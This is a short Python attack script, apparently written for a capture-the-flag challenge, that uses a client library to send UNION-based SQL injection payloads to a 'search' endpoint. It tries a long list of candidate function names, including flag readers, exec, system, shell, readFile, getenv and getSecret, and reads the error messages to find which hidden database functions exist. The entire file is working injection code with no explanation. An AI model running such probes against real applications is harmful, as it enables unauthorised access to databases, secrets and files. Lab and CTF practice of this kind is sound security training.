from client import GhostClient

c = GhostClient()
c.bootstrap()

# Comprehensive list of words to test as SQL functions
test_funcs = [
    "flag", "get_flag", "read_flag", "getFlag", "readFlag", "fetchFlag",
    "admin", "get_admin", "isAdmin", "checkAdmin",
    "config", "getConfig", "get_config", "env", "getenv", "getEnv",
    "exec", "eval", "system", "cmd", "shell", "run", "process",
    "read", "readFile", "read_file", "file", "getFile",
    "token", "jwt", "auth", "session", "user", "getUser",
    "secret", "getSecret", "get_secret", "key", "getKey", "get_key",
    "debug", "getDebug", "log", "logs", "getLog", "getLogs",
    "pcap", "getPcap", "archive", "getArchive", "history",
    "status", "health", "info", "version",
    "crypto", "decrypt", "encrypt", "hash", "sign", "verify",
    "gateway", "dispatch", "route", "handler",
]

found_funcs = []
for name in test_funcs:
    # Test with 0 args
    q0 = f"' UNION SELECT 1, cast({name}() as text), 3--"
    res0 = c.request("search", {"q": q0})
    err0 = res0.get("error", "")

    # Test with 1 arg
    q1 = f"' UNION SELECT 1, cast({name}('test') as text), 3--"
    res1 = c.request("search", {"q": q1})
    err1 = res1.get("error", "")

    if "no such function" not in err0 and "archive query rejected" not in err0:
        print(f"FOUND FUNCTION (0 args): {name} -> {res0}")
        found_funcs.append((name, 0, res0))
    elif "no such function" not in err1 and "archive query rejected" not in err1:
        print(f"FOUND FUNCTION (1 arg): {name} -> {res1}")
        found_funcs.append((name, 1, res1))
    elif "wrong number of arguments" in err0 or "wrong number of arguments" in err1:
        print(f"ARG COUNT MISMATCH: {name} -> 0arg:{err0} | 1arg:{err1}")

print("Search complete.")
